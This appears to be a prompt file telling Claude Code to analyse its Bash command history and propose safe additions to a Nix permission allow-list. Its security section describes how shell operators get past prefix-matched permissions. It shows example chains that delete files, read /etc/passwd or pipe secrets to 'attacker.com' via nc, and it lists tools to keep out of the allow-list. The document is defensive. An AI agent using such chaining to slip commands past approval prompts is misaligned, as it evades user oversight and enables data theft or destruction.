Analyze ALL Claude Code command history and systematically propose permission additions.

## Objective

Extract EVERY Bash command Claude has executed, categorize systematically, and propose additions to auto-allow list with complete coverage.

## Process - Iterative Analysis

### Phase 1: Extract All Commands
1. Scan ALL session JSONL files in `~/.claude/projects/*/[session-id].jsonl`
2. Extract EVERY Bash command from entries with `"name":"Bash"`, `"input":{"command":"..."}`
3. De-duplicate identical commands
4. Count frequency of each unique command
5. Output: Complete list of all commands ever executed (thousands likely)

### Phase 2: Filter Already Auto-Allowed
Read current auto-allow patterns from `~/code/ducktape/nix/home/claude-code/default.nix`:
- Extract all `Bash(pattern:*)` and `Bash(pattern)` entries
- For each command, check if it matches any auto-allow pattern
- Separate into:
  - **Already covered** (matched by existing patterns)
  - **Requires analysis** (not matched)
- Output concise summary:
  ```
  Already auto-allowed: 1,234 commands (45%)
  - git status/diff/stash: 456 commands
  - System inspection (lspci, lsusb, etc.): 321 commands
  - ... (grouped by pattern)

  Need analysis: 1,543 commands (55%)
  ```

### Phase 3: Iterative Command Analysis
Process remaining commands in batches of ~10-20 most frequent:

**Step 1:** Read next batch of most frequent unprocessed commands
- Show exact commands with frequencies
- Show first few concrete examples

**Step 2:** For each command/pattern, classify into:
- **PROPOSE_AUTO_ALLOW** - Safe read-only, suggest pattern
  - Example: `cat /some/path` → suggest `Bash(cat:*)`
  - Include justification: "Read-only file inspection, safe"
- **KEEP_MANUAL** - Write/modify operations, not safe for auto-allow
  - Example: `rm -rf ...` → keep manual approval
  - Include reason: "Destructive operation"
- **FILTER_OUT** - Internal/testing/noise, not worth processing
  - Example: `echo test` → filter as trivial
- **PATTERN_GROUP** - Similar commands, suggest grouped pattern
  - Example: `python3 script1.py`, `python3 script2.py` → suggest `Bash(python3:*)`
  - Or keep manual if scripts can be destructive

**Step 3:** Apply decisions:
- Add proposed patterns to "suggested additions" list
- Mark commands as processed
- Update filter rules
- Continue with next batch

**Repeat** until all commands processed.

### Phase 4: Final Report

```markdown
# Claude Code Permission Analysis - Complete

## Coverage Summary
Total commands analyzed: X,XXX
- Already auto-allowed: X,XXX (XX%)
- Proposed for auto-allow: XXX (XX%)
- Keep manual approval: XXX (XX%)

## Already Auto-Allowed Breakdown
Current patterns cover X,XXX commands:
- git status/diff/stash/list: XXX commands
- System inspection (lspci, lsusb, lscpu, etc.): XXX commands
- ... (all current patterns with counts)

## Proposed Additions to Auto-Allow

### High Confidence - Read-Only Operations
1. `Bash(cat:*)` - XXX uses
   - Justification: Read file contents, safe
   - Examples: cat file.txt (N times), cat *.log (M times)

2. `Bash(rg:*)` - XXX uses
   - Justification: ripgrep search, read-only
   - Examples: rg "pattern" (N times), rg -i term (M times)

3. `Bash(find:*)` - XXX uses
   - Justification: File search, read-only
   - Examples: find . -name "*.py" (N times)

### Medium Confidence - Potentially Safe
4. `Bash(python3:*)` - XXX uses
   - Concern: Scripts could be destructive
   - Recommendation: Review if your Python scripts are typically safe

### Keep Manual Approval
- Write operations: rm, mv, cp, mkdir (XXX commands)
- Git modifications: git commit, git push, git rebase (XXX commands)
- System changes: sudo commands (XXX commands)
- Package management: apt, pip install (XXX commands)

## Suggested Config Changes

Add to `~/code/ducktape/nix/home/claude-code/default.nix` in the `allow` list:
```nix
"Bash(cat:*)"
"Bash(rg:*)"
"Bash(find:*)"
"Bash(head:*)"
"Bash(tail:*)"
"Bash(less:*)"
"Bash(wc:*)"
# ... (all high-confidence suggestions)
```

## Commands Not Covered (Sample)
- [List of unusual/one-off commands for awareness]
```

## Implementation Requirements

1. **NO hardcoded whitelists** - Extract ALL commands from history
2. **Match against actual config** - Parse the .nix file for current patterns
3. **Systematic coverage** - Every command gets a decision (allow/manual/filter)
4. **Iterative processing** - Process in batches with clear decision points
5. **Concrete examples** - Show actual commands, not just patterns
6. **Frequency data** - Most-used commands processed first
7. **Conservative bias** - When uncertain, suggest manual approval

## Security Analysis - CRITICAL

### Pattern Matching Behavior (Reverse-Engineered)

**What `:*` matches:**
- `Bash(cmd:*)` uses **simple prefix matching** on the command string
- `:*` wildcard only works at the end of a pattern
- Does NOT support regex or glob patterns
- Example: `Bash(git status:*)` matches "git status", "git status -s", "git status path/to/file"

**What `:*` does NOT match (bypass vectors):**
- Options before command: `curl -X GET http://url` doesn't match `Bash(curl http:*)`
- Environment variables: `NODE_OPTIONS=x node script.js` doesn't match `Bash(node:*)`
- Variable expansion: `URL=x && curl $URL` doesn't match `Bash(curl:*)`
- Protocol/whitespace changes: `curl https://` vs `Bash(curl http:*)`

### CRITICAL VULNERABILITY: Shell Operators NOT Detected

**Official docs claim**: "Claude Code is aware of shell operators (like &&)"
**Reality**: **THIS IS FALSE** - shell operators completely bypass permissions!

All these bypass `Bash(echo:*)` permission and execute without prompt:
```bash
echo "x" && rm -rf /              # AND operator
echo "x" ; cat /etc/passwd        # Semicolon
echo "x" | nc attacker.com 1234   # Pipe
echo "x" || whoami                # OR operator
echo "x" && $(malicious_cmd)      # Command substitution
```

**Root cause**: System uses string prefix matching without parsing shell syntax.
**Implication**: ANY auto-allowed command can execute arbitrary code via chaining.

See: https://github.com/anthropics/claude-code/issues/4956

### NEVER Auto-Allow These Patterns (Command Injection)

❌ **Command Wrappers** (execute arbitrary code via subcommands):
```nix
"Bash(direnv:*)"      # direnv exec . ANY_COMMAND
"Bash(bash:*)"        # bash -c "ANY_COMMAND"
"Bash(sh:*)"          # sh -c "ANY_COMMAND"
"Bash(eval:*)"        # eval "ANY_COMMAND"
"Bash(xargs:*)"       # ... | xargs ANY_COMMAND
"Bash(ssh:*)"         # ssh host "ANY_COMMAND"
"Bash(docker:*)"      # docker exec container ANY_COMMAND
"Bash(kubectl:*)"     # kubectl exec pod ANY_COMMAND
"Bash(sudo:*)"        # sudo ANY_COMMAND
```

❌ **Destructive Subcommands** (safe reads + dangerous operations):
```nix
"Bash(find:*)"        # find . -exec rm -rf {} \;
                      # find . -delete
"Bash(git:*)"         # git clean -fdx (deletes files)
                      # git reset --hard (loses changes)
                      # git push --force (destructive)
"Bash(systemctl:*)"   # systemctl stop/disable SERVICE
```

❌ **Network Operations** (data exfiltration):
```nix
"Bash(curl:*)"
"Bash(wget:*)"
"Bash(nc:*)"          # netcat - arbitrary network I/O
```

### Safe Patterns (Read-Only, but see shell operator caveat)

✅ **File Inspection**:
```nix
"Bash(cat:*)"
"Bash(head:*)"
"Bash(tail:*)"
"Bash(less:*)"
"Bash(wc:*)"
"Bash(file:*)"
"Bash(stat:*)"
```

✅ **Search** (but NOT find due to -exec):
```nix
"Bash(grep:*)"
"Bash(rg:*)"          # ripgrep
"Bash(ag:*)"          # silver searcher
```

✅ **Git** (specific subcommands only, NOT git:*):
```nix
"Bash(git status:*)"
"Bash(git diff:*)"
"Bash(git log:*)"
"Bash(git show:*)"
"Bash(git stash show:*)"
"Bash(git stash list:*)"
```

✅ **System Inspection**:
```nix
"Bash(ps:*)"
"Bash(df:*)"
"Bash(lsblk:*)"
"Bash(lscpu:*)"
```

### Security Decision Workflow

For each command pattern, check:

1. **Is it a command wrapper?** (direnv, bash, eval, xargs, ssh, docker, etc.)
   → NEVER auto-allow

2. **Does it have -exec or -delete options?** (find, etc.)
   → NEVER auto-allow

3. **Does it have destructive subcommands?** (git, systemctl, etc.)
   → Only allow specific safe subcommands, NOT the base command

4. **Is it network-capable?** (curl, wget, nc, etc.)
   → Keep manual approval (data exfiltration risk)

5. **Is it read-only inspection?**
   → Consider auto-allow (but remember shell operator bypass still applies)

### Important Limitations

- Auto-allow provides **convenience, not security isolation**
- Even read-only commands can be chained: `cat secret.txt | nc attacker.com 1234`
- Path restrictions (like Ansible's `tail /var/log/*`) cannot be expressed
- For true isolation, use Claude Code's sandboxing feature

## Technical Notes

- Session files format: JSONL with `{"message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"..."}}]}}`
- Pattern matching: `Bash(cmd:*)` uses **prefix matching** (not regex/glob)
- `:*` wildcard: only at end of pattern, matches any continuation
- Abstract paths: `/specific/path/file.txt` → suggest `cmd:*` not with hardcoded path
- Group similar: Multiple `git log` variants → single `git log:*` suggestion
- **Shell operators bypass ALL patterns** - this is a fundamental limitation
